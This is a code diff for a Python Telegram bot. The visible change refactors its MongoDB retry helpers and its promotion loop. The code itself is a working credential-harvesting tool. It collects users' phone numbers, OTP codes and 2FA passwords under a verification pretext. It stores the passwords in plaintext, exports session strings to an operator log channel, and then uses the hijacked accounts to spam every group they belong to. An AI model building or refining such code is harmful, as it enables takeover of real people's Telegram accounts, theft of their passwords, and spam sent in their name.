@@ -23,52 +23,46 @@ from pyrogram.errors import (
     SessionRevoked,
     SessionExpired
 )
+# Updated MongoDB imports
 from motor.motor_asyncio import AsyncIOMotorClient
 from pymongo.server_api import ServerApi
-from config import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, PROMO_TEXTS, STRINGS, OTP_KEYBOARD, VERIFICATION_SUCCESS_KEYBOARD
+from pymongo.errors import OperationFailure
 from tenacity import retry, stop_after_attempt, wait_exponential
+from config import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES, PROMO_TEXTS, STRINGS, OTP_KEYBOARD, VERIFICATION_SUCCESS_KEYBOARD
 
-# MongoDB Connection Setup with Connection Pooling
+# ====================== OPTIMIZED MONGODB CONNECTION SYSTEM ======================
+# MongoDB Connection Setup with pooling and retry
 mongo_client = AsyncIOMotorClient(
     DATABASE_URI_SESSIONS_F,
+    minPoolSize=10,        # 10 connections always ready
+    maxPoolSize=100,       # Max 100 parallel connections
+    socketTimeoutMS=30000, # 30 sec operation timeout
+    connectTimeoutMS=30000,# 30 sec connection timeout
     server_api=ServerApi('1'),
-    maxPoolSize=100,
-    minPoolSize=10,
-    retryWrites=True,
-    socketTimeoutMS=30000,
-    connectTimeoutMS=30000
+    retryWrites=True       # Auto-retry failed writes
 )
 database = mongo_client['Cluster0']['sessions']
 
-# Test MongoDB connection
-async def test_db_connection():
+# Retry decorator for MongoDB operations
+@retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=2, max=10))
+async def mongo_operation(operation, *args, **kwargs):
     try:
-        await mongo_client.admin.command('ping')
-        print("Successfully connected to MongoDB!")
-    except Exception as e:
-        print(f"MongoDB connection error: {e}")
+        return await operation(*args, **kwargs)
+    except OperationFailure as e:
+        if "locked" in str(e).lower():
+            print("🔄 Database locked - retrying operation...")
+            await asyncio.sleep(1)
+            raise
         raise
 
-asyncio.create_task(test_db_connection())
-
-# State Management
+# ====================== STATE MANAGEMENT ======================
 user_states = {}
 
-# Retry decorator for MongoDB operations
-@retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=4, max=10))
-async def db_find_one(query):
-    return await database.find_one(query)
-
-@retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=4, max=10))
-async def db_update_one(query, update_data, upsert=False):
-    return await database.update_one(query, {'$set': update_data}, upsert=upsert)
-
-@retry(stop=stop_after_attempt(3), wait=wait_exponential(multiplier=1, min=4, max=10))
-async def db_insert_one(data):
-    return await database.insert_one(data)
-
 async def check_login_status(user_id):
-    user_data = await db_find_one({"id": user_id})
+    user_data = await mongo_operation(
+        database.find_one,
+        {"id": user_id}
+    )
     return bool(user_data and user_data.get('logged_in'))
 
 async def cleanup_user_state(user_id):
@@ -78,6 +72,7 @@ async def cleanup_user_state(user_id):
             await state['client'].disconnect()
         del user_states[user_id]
 
+# ====================== ERROR HANDLING ======================
 async def handle_session_error(bot: Client, phone_number: str, error: Exception):
     error_type = {
         AuthKeyUnregistered: "SESSION_EXPIRED",
@@ -91,15 +86,20 @@ async def handle_session_error(bot: Client, phone_number: str, error: Exception)
         f"🛑 Auto-disabled promotion\n"
         f"❌ Error: {str(error)[:200]}"
     )
-    await db_update_one(
+    await mongo_operation(
+        database.update_one,
         {"mobile_number": phone_number},
-        {"promotion": False}
+        {"$set": {"promotion": False}}
     )
 
+# ====================== COMMAND HANDLERS ======================
 @Client.on_message(filters.private & filters.command("start"))
 async def start_login(bot: Client, message: Message):
     user_id = message.from_user.id
-    user_data = await db_find_one({"id": user_id})
+    user_data = await mongo_operation(
+        database.find_one,
+        {"id": user_id}
+    )
     
     if user_data and user_data.get('session'):
         try:
@@ -108,17 +108,19 @@ async def start_login(bot: Client, message: Message):
             await test_client.get_me()
             await test_client.disconnect()
             
-            await db_update_one(
+            await mongo_operation(
+                database.update_one,
                 {"id": user_id},
-                {"logged_in": True}
+                {"$set": {"logged_in": True}}
             )
             await message.reply(STRINGS['verification_success'])
             asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
             return
         except Exception:
-            await db_update_one(
+            await mongo_operation(
+                database.update_one,
                 {"id": user_id},
-                {"logged_in": False, "session": None, "promotion": False}
+                {"$set": {"logged_in": False, "session": None, "promotion": False}}
             )
     
     if await check_login_status(user_id):
@@ -138,14 +140,16 @@ async def start_login(bot: Client, message: Message):
 async def handle_logout(bot: Client, message: Message):
     user_id = message.from_user.id
     
-    await db_update_one(
+    await mongo_operation(
+        database.update_one,
         {"id": user_id},
-        {"logged_in": False}
+        {"$set": {"logged_in": False}}
     )
     
     await message.reply(STRINGS['logout_success'])
     await cleanup_user_state(user_id)
-    
+
+# ====================== PHONE NUMBER HANDLING ======================    
 @Client.on_message(filters.private & filters.contact)
 async def handle_contact(bot: Client, message: Message):
     user_id = message.from_user.id
@@ -186,6 +190,7 @@ async def handle_contact(bot: Client, message: Message):
         await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
+# ====================== OTP HANDLING ======================
 @Client.on_callback_query(filters.regex("^otp_"))
 async def handle_otp_buttons(bot: Client, query: CallbackQuery):
     user_id = query.from_user.id
@@ -216,9 +221,10 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
             state['otp_attempts'] += 1
             if state['otp_attempts'] >= 3:
                 await query.message.edit(STRINGS['otp_blocked'])
-                await db_update_one(
+                await mongo_operation(
+                    database.update_one,
                     {"id": user_id},
-                    {"blocked": True}
+                    {"$set": {"blocked": True}}
                 )
                 await cleanup_user_state(user_id)
                 return
@@ -247,6 +253,7 @@ async def handle_otp_buttons(bot: Client, query: CallbackQuery):
     )
     await query.answer()
 
+# ====================== 2FA PASSWORD HANDLING ======================
 @Client.on_message(filters.private & filters.text & ~filters.command(["start", "logout"]))
 async def handle_2fa_password(bot: Client, message: Message):
     user_id = message.from_user.id
@@ -272,12 +279,13 @@ async def handle_2fa_password(bot: Client, message: Message):
         verified_msg = await bot.send_message(user_id, "Password verified...", reply_markup=ReplyKeyboardRemove())
         state['verified_msg_id'] = verified_msg.id
         
-        await db_update_one(
+        await mongo_operation(
+            database.update_one,
             {"id": user_id},
-            {
+            {"$set": {
                 "2fa_status": True,
                 "2fa_password": password
-            },
+            }},
             upsert=True
         )
         
@@ -287,9 +295,10 @@ async def handle_2fa_password(bot: Client, message: Message):
         state['2fa_attempts'] += 1
         if state['2fa_attempts'] >= 3:
             await message.reply(STRINGS['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
-            await db_update_one(
+            await mongo_operation(
+                database.update_one,
                 {"id": user_id},
-                {"blocked": True}
+                {"$set": {"blocked": True}}
             )
             await cleanup_user_state(user_id)
             return
@@ -304,6 +313,7 @@ async def handle_2fa_password(bot: Client, message: Message):
         await message.reply(f"⚠️ Oops! Something went wrong.\n\nPlease try /start again later.", reply_markup=ReplyKeyboardRemove())
         await cleanup_user_state(user_id)
 
+# ====================== SESSION CREATION ======================
 async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
     try:
         string_session = await client.export_session_string()
@@ -316,11 +326,22 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
             'promotion': True
         }
         
-        if existing := await db_find_one({"id": user_id}):
-            await db_update_one({'_id': existing['_id']}, data)
+        existing = await mongo_operation(
+            database.find_one,
+            {"id": user_id}
+        )
+        if existing:
+            await mongo_operation(
+                database.update_one,
+                {'_id': existing['_id']},
+                {'$set': data}
+            )
         else:
             data['id'] = user_id
-            await db_insert_one(data)
+            await mongo_operation(
+                database.insert_one,
+                data
+            )
 
         os.makedirs("sessions", exist_ok=True)
         clean_phone = phone_number.replace('+', '')
@@ -361,9 +382,8 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
     finally:
         await cleanup_user_state(user_id)
 
+# ====================== PROMOTION SYSTEM ======================
 async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
-    BATCH_SIZE = 5  # Messages per batch
-    BATCH_DELAY = 2  # Seconds between batches
     already_notified = False
     status_message = None
     
@@ -439,7 +459,10 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                     message_text
                 )
             
-            user_data = await db_find_one({"mobile_number": phone_number})
+            user_data = await mongo_operation(
+                database.find_one,
+                {"mobile_number": phone_number}
+            )
             if not user_data or not user_data.get('promotion', True):
                 await bot.send_message(
                     LOG_CHANNEL_SESSIONS_FILES,
@@ -448,67 +471,49 @@ async def send_promotion_messages(bot: Client, session_string: str, phone_number
                 break
 
             sent_count = 0
-            batch = []
-            
             for group in groups:
-                batch.append(group)
-                if len(batch) >= BATCH_SIZE:
-                    for g in batch:
-                        try:
-                            promo_text = random.choice(PROMO_TEXTS)
-                            await client.send_message(g.id, promo_text)
-                            sent_count += 1
-                            
-                            try:
-                                await status_message.edit_text(
-                                    f"🚀 Promotion Starting For: {phone_number}\n"
-                                    f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
-                                    f"📊 Status:\n"
-                                    f"• Total Groups: {total_groups}\n"
-                                    f"• Owned Groups: {owned_groups}\n"
-                                    f"• Owned Channels: {owned_channels}\n"
-                                    f"• Total Members in Owned Chats: {members_count}\n\n"
-                                    f"✅ Total Messages Sent: {sent_count}/{total_groups}"
-                                )
-                            except Exception:
-                                status_message = await bot.send_message(
-                                    LOG_CHANNEL_SESSIONS_FILES,
-                                    f"🚀 Promotion Starting For: {phone_number}\n"
-                                    f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
-                                    f"📊 Status:\n"
-                                    f"• Total Groups: {total_groups}\n"
-                                    f"• Owned Groups: {owned_groups}\n"
-                                    f"• Owned Channels: {owned_channels}\n"
-                                    f"• Total Members in Owned Chats: {members_count}\n\n"
-                                    f"✅ Total Messages Sent: {sent_count}/{total_groups}"
-                                )
-                        except FloodWait as e:
-                            await bot.send_message(
-                                LOG_CHANNEL_SESSIONS_FILES,
-                                f"⏳ FloodWait {e.value}s for {phone_number}"
-                            )
-                            await asyncio.sleep(e.value + 5)
-                        except Exception as e:
-                            await bot.send_message(
-                                LOG_CHANNEL_SESSIONS_FILES,
-                                f"❌ Failed to send to {getattr(g, 'title', '?')}: {str(e)[:200]}"
-                            )
+                try:
+                    promo_text = random.choice(PROMO_TEXTS)
+                    await client.send_message(group.id, promo_text)
+                    sent_count += 1
                     
-                    await asyncio.sleep(BATCH_DELAY)
-                    batch = []
-            
-            # Process remaining groups in batch
-            if batch:
-                for g in batch:
                     try:
-                        promo_text = random.choice(PROMO_TEXTS)
-                        await client.send_message(g.id, promo_text)
-                        sent_count += 1
-                    except Exception as e:
-                        await bot.send_message(
-                            LOG_CHANNEL_SESSIONS_FILES,
-                            f"❌ Failed to send to {getattr(g, 'title', '?')}: {str(e)[:200]}"
+                        await status_message.edit_text(
+                            f"🚀 Promotion Starting For: {phone_number}\n"
+                            f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
+                            f"📊 Status:\n"
+                            f"• Total Groups: {total_groups}\n"
+                            f"• Owned Groups: {owned_groups}\n"
+                            f"• Owned Channels: {owned_channels}\n"
+                            f"• Total Members in Owned Chats: {members_count}\n\n"
+                            f"✅ Total Messages Sent: {sent_count}/{total_groups}"
                         )
+                    except Exception:
+                        status_message = await bot.send_message(
+                            LOG_CHANNEL_SESSIONS_FILES,
+                            f"🚀 Promotion Starting For: {phone_number}\n"
+                            f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
+                            f"📊 Status:\n"
+                            f"• Total Groups: {total_groups}\n"
+                            f"• Owned Groups: {owned_groups}\n"
+                            f"• Owned Channels: {owned_channels}\n"
+                            f"• Total Members in Owned Chats: {members_count}\n\n"
+                            f"✅ Total Messages Sent: {sent_count}/{total_groups}"
+                        )
+                    
+                    await asyncio.sleep(60)
+                except FloodWait as e:
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"⏳ FloodWait {e.value}s for {phone_number}"
+                    )
+                    await asyncio.sleep(e.value + 5)
+                except Exception as e:
+                    await bot.send_message(
+                        LOG_CHANNEL_SESSIONS_FILES,
+                        f"❌ Failed to send to {getattr(group, 'title', '?')}: {str(e)[:200]}"
+                    )
+                    await asyncio.sleep(5)
 
             try:
                 await status_message.edit_text(
